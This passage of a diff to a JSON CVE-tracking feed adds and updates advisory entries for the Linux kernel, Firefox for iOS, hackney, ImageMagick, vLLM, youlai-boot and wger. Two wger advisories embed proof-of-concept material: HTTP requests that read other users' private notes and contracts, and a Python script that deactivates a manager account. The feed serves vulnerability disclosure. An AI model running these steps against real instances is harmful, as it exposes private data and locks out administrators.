condition for success restores the removal. On an AMD\nPhoenix APU (ASUS UM3406GA, gfx1103) running suspend-then-hibernate on\na 7.0.y stable kernel carrying the backport (Ubuntu 7.0.0-31) the bug\ncrashed 5 of 18 hibernation cycles; a function profile of one\nhibernation showed 336 ttm_tt_swapout() calls and zero\nttm_resource_del_bulk_move_unevictable() calls. With this change the\nremoval happens for every swapped-out resource and 12 further cycles\nwere clean.",
+      "published": "2026-10-06T09:17:58.033",
+      "updated": "2026-10-26T16:17:23.973",
+      "cvss": 7.8,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://git.kernel.org/stable/c/1169fe8c11ca45e3f91d59a73eb271d0ca8a7fb0",
+        "https://git.kernel.org/stable/c/3db7d7d583419f7b1f2e141e36418802dbb25cf8",
+        "https://git.kernel.org/stable/c/b48ebe399b4e72baa323462580fdd83ebda561e1"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00154,
+      "epss_percentile": 0.04474,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "linux-kernel"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 36.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.6,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-91484",
       "aliases": [],
       "title": "",
@@ -11256,6 +13606,102 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-116631",
+      "aliases": [],
+      "title": "External protocol handler (tel:) address bar spoof",
+      "description": "A malicious web page could open a tel link in a window that was showing a different website, causing the phone-call prompt to appear as if that site had requested the call. This vulnerability was fixed in Firefox for iOS 156.1.",
+      "published": "2026-10-26T18:32:36.715Z",
+      "updated": "2026-10-26T19:16:30.760",
+      "cvss": 5.4,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:L",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "Mozilla Firefox for iOS"
+      ],
+      "references": [
+        "https://bugzilla.mozilla.org/show_bug.cgi?id=1297353",
+        "https://www.mozilla.org/security/advisories/mfsa2026-117/"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "none",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "firefox"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 35.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 10.8,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-116632",
+      "aliases": [],
+      "title": "Facetime protocol handler enabled spoofing",
+      "description": "A malicious web page could insert arbitrary text into the FaceTime call prompt shown by iOS, potentialy allowing it to display a phishing message inside system UI. This vulnerability was fixed in Firefox for iOS 156.1.",
+      "published": "2026-10-26T18:32:35.728Z",
+      "updated": "2026-10-26T19:16:30.947",
+      "cvss": 5.4,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:L",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "Mozilla Firefox for iOS"
+      ],
+      "references": [
+        "https://bugzilla.mozilla.org/show_bug.cgi?id=1328815",
+        "https://www.mozilla.org/security/advisories/mfsa2026-117/"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "none",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "firefox"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 35.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 10.8,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-106074",
       "aliases": [],
       "title": "",
@@ -11445,29 +13891,23 @@
     {
       "id": "CVE-2026-97200",
       "aliases": [],
-      "title": "Unbounded response body buffering and decompression in hackney",
+      "title": "",
       "description": "Allocation of Resources Without Limits or Throttling vulnerability in hackney_conn in benoitc hackney allows a malicious HTTP server to exhaust client memory via an oversized or highly compressed response body. hackney:request/5 and hackney:body/1 return the whole response body, and nothing bounds how much the connection process buffers. Any server the client requests can trigger it.\n\nhackney_conn:read_full_body/2 and the HTTP/2 and HTTP/3 accumulators append every chunk until the body ends. With {auto_decompress, true} the buffered body is then inflated in one step with zlib:gunzip/1 or zlib:inflate/2, which return the whole output at once.\n\nThis issue affects hackney: from 2.0.0-beta.1 before 4.9.0.",
-      "published": "2026-10-26T13:49:40.392Z",
-      "updated": "2026-10-26T14:16:42.180",
+      "published": "2026-10-26T14:16:42.180",
+      "updated": "2026-10-26T16:59:16.113",
       "cvss": 8.2,
-      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
-      "cpes": [
-        "benoitc:hackney"
-      ],
+      "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "benoitc hackney",
-        "hackney",
-        "benoitc/hackney"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://github.com/benoitc/hackney/releases/tag/4.9.0",
         "https://cna.erlef.org/cves/CVE-2026-97200.html",
-        "https://osv.dev/vulnerability/EEF-CVE-2026-97200",
-        "https://github.com/benoitc/hackney/pull/980",
+        "https://github.com/benoitc/hackney/commit/493e8bf83a391548e5101792276ab3fc428fa76c",
         "https://github.com/benoitc/hackney/commit/dc41b79339ca0c41e16d3f2dd17172bc2de855d6",
-        "https://github.com/benoitc/hackney/commit/493e8bf83a391548e5101792276ab3fc428fa76c"
+        "https://github.com/benoitc/hackney/pull/980",
+        "https://github.com/benoitc/hackney/releases/tag/4.9.0",
+        "https://osv.dev/vulnerability/EEF-CVE-2026-97200"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -11478,7 +13918,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -12812,7 +15251,7 @@
       "title": "",
       "description": "ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the handling of XMP profiles by various decoders. Attackers can supply images with a crafted XMP profile that leak memory each time they are processed, leading to resource exhaustion and denial of service.",
       "published": "2026-10-25T14:16:53.993",
-      "updated": "2026-10-26T13:49:46.657",
+      "updated": "2026-10-26T17:17:21.943",
       "cvss": 6.9,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -13231,7 +15670,7 @@
       "title": "",
       "description": "ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a null pointer dereference in the DJVU decoder because the result of a memory allocation is not checked before use. Attackers can supply a DJVU image that, when processed under conditions where the allocation fails, crashes the process and causes a denial of service.",
       "published": "2026-10-25T14:16:52.840",
-      "updated": "2026-10-26T13:49:46.657",
+      "updated": "2026-10-26T17:17:21.650",
       "cvss": 6.3,
       "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -13277,7 +15716,7 @@
       "title": "",
       "description": "ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the JNG encoder that fails to release allocated memory when processing a crafted image. Attackers can supply crafted images that are encoded to JNG to leak memory, potentially causing resource exhaustion and a limited denial of service.",
       "published": "2026-10-25T14:16:53.423",
-      "updated": "2026-10-26T13:49:46.657",
+      "updated": "2026-10-26T17:17:21.783",
       "cvss": 6.3,
       "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -13411,6 +15850,55 @@
         "popularity": 21.0,
         "cvss": 10.6,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-110215",
+      "aliases": [],
+      "title": "",
+      "description": "youlai-boot through 2.21.1 contains a missing authorization vulnerability that allows authenticated users to assign arbitrary menu and button permissions to roles via PUT /api/v1/roles/{roleId}/menus. Low-privileged users such as the GUEST test account can grant all permissions to their own role, refreshing the Redis permission cache to gain administrator-equivalent access.",
+      "published": "2026-10-13T19:18:45.640",
+      "updated": "2026-10-26T19:16:29.207",
+      "cvss": 8.7,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/youlaitech/youlai-boot/blob/v2.21.1/src/main/java/com/youlai/boot/system/controller/RoleController.java#L111-L119",
+        "https://github.com/youlaitech/youlai-boot/blob/v2.21.1/src/main/java/com/youlai/boot/system/service/impl/RoleServiceImpl.java#L222-L243",
+        "https://github.com/youlaitech/youlai-boot/commit/36d2db6dc559817bd4e02b1f33b1998891850497",
+        "https://hackmd.io/@1ExmmukzRMWN7B4gQ4W-4Q/youlai-boot-role-menu-assignment-and-user-status-missing-authorization",
+        "https://www.vulncheck.com/advisories/youlai-boot-through-2.21.1-missing-authorization-in-role-menu-assignment-allows-privilege-escalation",
+        "https://hackmd.io/@1ExmmukzRMWN7B4gQ4W-4Q/youlai-boot-role-menu-assignment-and-user-status-missing-authorization"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00411,
+      "epss_percentile": 0.3506,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "redis"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 31.5,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 17.4,
+        "epss": 0.1
       },
       "ai_analysis": ""
     },
@@ -13609,7 +16097,7 @@
       "title": "",
       "description": "vLLM from 0.18.0 before 0.31.0 contains a resource exhaustion vulnerability that allows API clients to bypass the video/jpeg frame-count cap by overriding num_frames through media_io_kwargs. Attackers can set num_frames to -1 with a large inline video so VideoMediaIO.load_base64 decodes every frame, exhausting memory and crashing the API frontend.",
       "published": "2026-10-25T14:16:57.620",
-      "updated": "2026-10-26T14:03:56.640",
+      "updated": "2026-10-26T17:17:22.903",
       "cvss": 8.7,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
@@ -14020,6 +16508,212 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-115915",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. Prior to 0.32.0, ImageMediaIO passes attacker-controlled image bytes to Pillow through Image.open(BytesIO(data)) without restricting decoder selection, and the MIME label does not constrain the selected format. Image-capable request paths through parse_image() and fetch_image() can therefore dispatch an EPS payload to host components. A host with Ghostscript affected by CVE-2024-29510 can execute commands with the vLLM process's privileges, while environments using Pillow 12.0.0 through 12.2.0 can trigger CVE-2026-59203 and exhaust media-loading workers. Deployments without the applicable vulnerable dependency are not affected by that corresponding impact. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T18:17:38.883",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/710ac56e691d4713feca50a43e6c440f07d373fd",
+        "https://github.com/vllm-project/vllm/pull/60022",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-h3rc-j82p-2c3h"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 28.2,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 16.2,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-43976",
+      "aliases": [
+        "GHSA-c72h-82w6-rqfp"
+      ],
+      "title": "wger: cross-tenant admin notes/contracts leak via gym=None bypass (5 views)",
+      "description": "### Summary\n\nFive gym management views in wger apply a flawed gym-scope guard (`gym_a != gym_b`) that silently passes when both operands are `None`. A trainer with `gym.gym_trainer` and `gym.add_adminusernote` permissions and no gym assignment (`gym=None`) can read private admin notes, uploaded documents, gym contracts, user configuration, and user permission data for **any other unaffiliated user** on the instance. The subsequent querysets filter only on the attacker-supplied `member_id` with no secondary gym-scoped validation, so all records are disclosed.\n\n### Details\n\n**Files**: `wger/gym/views/user.py`, `wger/gym/views/admin_notes.py`, `wger/gym/views/document.py`, `wger/gym/views/contract.py`, `wger/gym/views/user_config.py`\n\nThe same flawed comparison pattern appears across at least five views:\n\n```python\n# VULNERABLE - applied in admin_notes_list, documents_list, contracts_list,\n#              user_config, and gym_permissions_user_edit\nif request.user.userprofile.gym != user.userprofile.gym:\n    return HttpResponseForbidden()\n\n# After the guard (admin notes example):\nnotes = AdminUserNote.objects.filter(member=member)  # only filtered by member_id\n```\n\nWhen both `request.user.userprofile.gym` and `user.userprofile.gym` are `None`, Python evaluates `None != None` as `False`, and `HttpResponseForbidden` is never reached. The subsequent queryset applies only the attacker-supplied `member` (user ID) as a filter — there is no secondary check tying the queryset to the requesting trainer's gym. All private admin notes, documents, and contracts for the target user are returned in the response body.\n\n**Affected endpoints**:\n- `GET /en/gym/notes/list/user/<member_pk>` -> admin notes list view\n- `GET /en/gym/documents/list/user/<member_pk>` -> documents list view\n- `GET /en/gym/contract/list/<member_pk>` -> contracts list view\n- `GET /en/gym/user/<member_pk>/config` -> user config view\n- `GET /en/gym/user/<member_pk>/permissions` -> permission edit view\n\n**Suggested patch**:\n\n```diff\n--- a/wger/gym/views/user.py\n+++ b/wger/gym/views/user.py\n-    if request.user.userprofile.gym != user.userprofile.gym:\n-        return HttpResponseForbidden()\n+    trainer_gym_id = request.user.userprofile.gym_id\n+    member_gym_id  = user.userprofile.gym_id\n+\n+    if trainer_gym_id is None or trainer_gym_id != member_gym_id:\n+        return HttpResponseForbidden()\n\n# Also tighten the queryset with a gym-scoped secondary filter:\n-    notes = AdminUserNote.objects.filter(member=member)\n+    notes = AdminUserNote.objects.filter(\n+        member=member,\n+        member__userprofile__gym_id=request.user.userprofile.gym_id,\n+    )\n```\n\nExtract a shared helper `assert_same_gym(trainer, member)` and call it consistently from all five affected views to eliminate future drift.\n\n### PoC\n\nTested on `wger/server:latest` Docker image. Test users: `trainer1` (`gym.gym_trainer` + `gym.add_adminusernote` permissions, `userprofile.gym=None`) and `alice` (regular user, `userprofile.gym=None`, has a private admin note pre-seeded).\n\n**Step 1** - Authenticate as trainer with required perms and gym=None:\n\n```\nPOST /en/user/login HTTP/1.1\nHost: target\nContent-Type: application/x-www-form-urlencoded\n\nusername=trainer1&password=[REDACTED]&csrfmiddlewaretoken=[REDACTED]\n\n-> 302 Found; Set-Cookie: sessionid=[trainer1_session]\n```\n\n**Step 2** - Read victim's private admin notes:\n\n```\nGET /en/gym/notes/list/user/2 HTTP/1.1\nHost: target\nCookie: sessionid=[trainer1_session]\n\n-> 200 OK\nbody contains all private admin notes for user 2:\n  \"PRIVATE_NOTE_ABOUT_ALICE_SALARY_50K\"\n  \"PHASE4_SECRET_SALARY_100K\"\n```\n\n**Step 3** - Read victim's documents and contracts (same pattern):\n\n```\nGET /en/gym/documents/list/user/2\nGET /en/gym/contract/list/2\n\n-> 200 OK for each; all records disclosed\n```\n\n**Step 4** (optional) - Mass enumeration across all gym=None users:\n\n```\nIterate user PKs 1..N:\nGET /en/gym/notes/list/user/{uid}\n-> 200 = gym=None victim (notes leaked)\n-> 403 = gym-assigned user (check works correctly when gym values differ)\n```\n\n**RBAC Disproof Protocol**:\n- Scenario A (admin, gym=1 -> member gym=1) -> HTTP 200 (expected - same-gym read is a documented feature)\n- Scenario B (trainer1, gym=None -> alice gym=None) -> **HTTP 200 with PII in body** (expected HTTP 403)\n- Scenario C (admin, gym=1 -> alice gym=None) -> HTTP 403 (expected - guard works when gyms differ; confirms bypass is `None`-specific)\n\nReproducibility: 2/2 runs after clean-baseline database reset.\n\n### Impact\n\nAn authenticated trainer with `gym.gym_trainer` + `gym.add_adminusernote` permissions and `userprofile.gym=None` can:\n\n1. Enumerate and read all private admin notes for every other `gym=None` user (notes may contain salary data, medical notes, disciplinary records).\n2. Download all uploaded documents attached to those users (contracts, ID scans, medical forms).\n3. Read all gym contracts (financial terms, subscription details).\n4. Read user configuration details.\n5. Via the permissions endpoint, potentially **modify victim permissions** (creates a privilege escalation path - not fully explored in this submission but the endpoint is reachable).\n\n**Affected deployments**: every wger instance where `gym.gym_trainer` + `gym.add_adminusernote` are delegated to non-admin users AND any other users exist with `gym=None`. The `gym=None` state is the **default for newly registered users** before manual gym assignment, so every public-registration wger instance is affected.\n\n**Severity**: High (CVSS 7.1). Network-reachable, low complexity, requires only low privilege (delegated trainer), scope unchanged (same wger authority), high confidentiality loss across all unaffiliated accounts, low integrity impact (permission-edit view reachable).\n\nThis is structurally the same bug class as the sibling findings affecting `trainer_login` and `reset_user_password` (submitted separately). The root cause - Django ORM object-`!=` returning `False` when both sides are `None` - warrants a shared `same_gym()` helper applied across all five views.",
+      "published": "2026-10-07T13:33:14Z",
+      "updated": "2026-10-26T15:50:10Z",
+      "cvss": 7.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:wger"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-c72h-82w6-rqfp",
+        "https://github.com/wger-project/wger/security/advisories/GHSA-c72h-82w6-rqfp",
+        "https://github.com/wger-project/wger/releases/tag/2.6",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43976",
+        "https://github.com/wger-project/wger/commit/b51f472ab2f790d8b4e67b4371bd6d1915af2930",
+        "https://github.com/wger-project/wger/commit/e1d329ff4ef6213b0a1adc5daf115e6d8981190c"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00219,
+      "epss_percentile": 0.12338,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "django"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 28.2,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 14.2,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-46434",
+      "aliases": [
+        "GHSA-x249-cx55-2h87"
+      ],
+      "title": "wger: Trainer Privilege Escalation - Improper Privilege Management",
+      "description": "### Summary\n\nA user with only the `gym_trainer` permission can deactivate any account in the same gym, including `gym_manager` and `general_gym_manager` accounts. The `UserDeactivateView` grants access to anyone holding **any one** of `gym.manage_gym`, `gym.manage_gyms`, or `gym.gym_trainer` (OR logic via `WgerMultiplePermissionRequiredMixin`), and performs no privilege-hierarchy check to prevent a lower-privileged role from disabling a higher-privileged one.\n\n### Details\n\n`UserDeactivateView` (file: `wger/core/views/user.py`, line 378) is configured with:\n\n```python\npermission_required = ('gym.manage_gym', 'gym.manage_gyms', 'gym.gym_trainer')\n```\n\n`WgerMultiplePermissionRequiredMixin` (file: `wger/utils/generic_views.py`, line 48) treats this tuple as an OR check -- any single permission is sufficient:\n\n```python\nclass WgerMultiplePermissionRequiredMixin(PermissionRequiredMixin):\n    def has_permission(self):\n        for permission in self.get_permission_required():\n            if self.request.user.has_perm(permission):\n                return True      # <-- ANY one permission is enough\n        return False\n```\n\nThe `dispatch()` method only verifies same-gym membership:\n\n```python\ndef dispatch(self, request, *args, **kwargs):\n    edit_user = get_object_or_404(User, pk=self.kwargs['pk'])\n    if (\n        request.user.has_perm('gym.manage_gym')\n        or request.user.has_perm('gym.gym_trainer')\n    ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:\n        return HttpResponseForbidden()\n    # NO check: is the target user more privileged than the requester?\n    return super().dispatch(request, *args, **kwargs)\n```\n\nThere is **no check** preventing a trainer from targeting a manager. The same vulnerability exists in `UserActivateView` (line 415).\n\nAn additional contributing factor: `get_permission_list()` in `wger/gym/helpers.py` (line 102) **always** includes `'trainer'` in the assignable roles, meaning any gym manager can create trainer accounts -- which can then deactivate the manager who created them.\n\n### PoC\n\n#### Prerequisites\n\n- A gym with at least two users: one with `gym_manager` role (victim) and one with `gym_trainer` role (attacker)\n- Both users belong to the same gym\n\n#### Attack Steps\n\n```\n# As the trainer, simply visit:\nGET /en/user/<manager_user_id>/deactivate\n```\n\nThe manager's account is immediately set to `is_active = False`. The manager can no longer log in.\n\n#### Proof of Concept Script\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: Trainer -> Manager Privilege Escalation (Account Deactivation)\nTarget: wger Workout Manager\nSeverity: HIGH - CVSS 6.5\nCWE-269: Improper Privilege Management\n\nUsage:\n    python3 poc.py http://localhost:8000\n\"\"\"\n\nimport requests\nimport sys\nimport re\n\nif len(sys.argv) < 2:\n    print(f\"Usage: {sys.argv[0]} <BASE_URL>\")\n    print(f\"Example: {sys.argv[0]} http://localhost:8000\")\n    sys.exit(1)\n\nBASE = sys.argv[1].rstrip(\"/\")\nAPI = f\"{BASE}/api/v2\"\n\nMANAGER_USER = \"gym_manager_poc\"\nMANAGER_PASS = \"Manager!Poc!2025\"\nTRAINER_USER = \"evil_trainer_poc\"\nTRAINER_PASS = \"Trainer!Poc!2025\"\n\nBANNER = \"\"\"\n=====================================================================\n  PoC: Trainer -> Manager Privilege Escalation\n  Severity: HIGH\n  CWE-269: Improper Privilege Management\n=====================================================================\n\"\"\"\nprint(BANNER)\n\n\n# ---- Helper ----\ndef api_login(username, password):\n    r = requests.post(f\"{API}/login/\", json={\n        \"username\": username, \"password\": password\n    })\n    if r.status_code == 200:\n        return r.json().get(\"token\")\n    return None\n\ndef api_headers(token):\n    return {\"Authorization\": f\"Token {token}\", \"Content-Type\": \"application/json\"}\n\n\n# ---- Setup via Django ORM (must run inside container) ----\n\nimport os, django\nos.environ['DJANGO_SETTINGS_MODULE'] = 'settings.main'\nsys.path.insert(0, '/home/wger/src')\ndjango.setup()\n\nfrom django.contrib.auth.models import User, Group\nfrom wger.gym.models import Gym\n\n# Ensure permission groups exist\nfor name in ['gym_member', 'gym_trainer', 'gym_manager', 'general_gym_manager']:\n    Group.objects.get_or_create(name=name)\n\n# Create gym\ngym, _ = Gym.objects.get_or_create(name=\"PoC Test Gym\")\nprint(f\"[*] Gym: {gym.name} (id={gym.id})\")\n\n# Create manager (the VICTIM)\nmanager, created = User.objects.get_or_create(\n    username=MANAGER_USER,\n    defaults={\"is_active\": True}\n)\nif created:\n    manager.set_password(MANAGER_PASS)\n    manager.save()\nmanager.userprofile.gym = gym\nmanager.userprofile.save()\nmanager.groups.clear()\nmanager.groups.add(Group.objects.get(name='gym_manager'))\nmanager.is_active = True\nmanager.save()\nprint(f\"[*] Manager (victim): {manager.username} (id={manager.id})\")\nprint(f\"    Groups: {[g.name for g in manager.groups.all()]}\")\nprint(f\"    is_active: {manager.is_active}\")\n\n# Create trainer (the ATTACKER)\ntrainer, created = User.objects.get_or_create(\n    username=TRAINER_USER,\n    defaults={\"is_active\": True}\n)\nif created:\n    trainer.set_password(TRAINER_PASS)\n    trainer.save()\ntrainer.userprofile.gym = gym\ntrainer.userprofile.save()\ntrainer.groups.clear()\ntrainer.groups.add(Group.objects.get(name='gym_trainer'))\nprint(f\"[*] Trainer (attacker): {trainer.username} (id={trainer.id})\")\nprint(f\"    Groups: {[g.name for g in trainer.groups.all()]}\")\n\n\n# ---- 1. Verify manager is active BEFORE attack ----\n\nmanager.refresh_from_db()\nprint(f\"\\n[*] Manager is_active BEFORE attack: {manager.is_active}\")\nassert manager.is_active, \"Manager should be active before test\"\n\n\n# ---- 2. ATTACK: Trainer deactivates manager ----\n\nprint(f\"\\n{'='*65}\")\nprint(f\"  ATTACK: Trainer deactivating gym manager account\")\nprint(f\"{'='*65}\")\n\nfrom django.test import Client\nc = Client()\nc.force_login(trainer)\nresp = c.get(f\"/en/user/{manager.id}/deactivate\", follow=True)\nprint(f\"\\n  GET /en/user/{manager.id}/deactivate\")\nprint(f\"  (Logged in as: {TRAINER_USER} - gym_trainer only)\")\nprint(f\"  Response: HTTP {resp.status_code}\")\n\n\n# ---- 3. VERIFY ----\n\nprint(f\"\\n{'='*65}\")\nprint(f\"  VERIFICATION\")\nprint(f\"{'='*65}\")\n\nmanager.refresh_from_db()\nprint(f\"\\n  Manager is_active AFTER attack: {manager.is_active}\")\n\nif not manager.is_active:\n    print(\"\"\"\n  +----------------------------------------------------------+\n  |  VULNERABILITY CONFIRMED                                 |\n  |                                                          |\n  |  A gym_trainer successfully deactivated a gym_manager!   |\n  |  No privilege hierarchy check prevents this.             |\n  |  The trainer can now lock out all managers from the gym.  |\n  +----------------------------------------------------------+\n\"\"\")\n    manager.is_active = True\n    manager.save()\n    print(\"  [+] Cleanup: Manager re-activated\")\nelse:\n    print(\"\\n  Manager is still active - NOT vulnerable\")\n```\n\n#### Proof of Concept Output\n\n```\n=====================================================================\n  PoC: Trainer -> Manager Privilege Escalation\n  Severity: HIGH\n  CWE-269: Improper Privilege Management\n=====================================================================\n\n[*] Gym: PoC Test Gym (id=2)\n[*] Manager (victim): gym_manager_poc (id=4)\n    Groups: ['gym_manager']\n    is_active: True\n[*] Trainer (attacker): evil_trainer_poc (id=5)\n    Groups: ['gym_trainer']\n\n[*] Manager is_active BEFORE attack: True\n\n=================================================================\n  ATTACK: Trainer deactivating gym manager account\n=================================================================\n\n  Trainer login: HTTP 200\n  GET http://localhost/en/user/4/deactivate\n  (Logged in as: evil_trainer_poc - gym_trainer only)\n  Response: HTTP 200\n\n=================================================================\n  VERIFICATION\n=================================================================\n\n  Manager is_active AFTER attack: False\n\n  +----------------------------------------------------------+\n  |  VULNERABILITY CONFIRMED                                 |\n  |                                                          |\n  |  A gym_trainer successfully deactivated a gym_manager!   |\n  |  No privilege hierarchy check prevents this.             |\n  |  The trainer can now lock out all managers from the gym.  |\n  +----------------------------------------------------------+\n\n  [+] Cleanup: Manager re-activated\n```\n\n### Impact\n\n1. **Gym Management Lockout:** A trainer can deactivate every manager account in their gym, effectively seizing control of the gym's administrative functions.\n2. **Denial of Service:** Deactivated managers cannot log in, manage members, or perform any administrative tasks until a `general_gym_manager` (superadmin) or a Django superuser manually re-activates their accounts.\n3. **Abuse 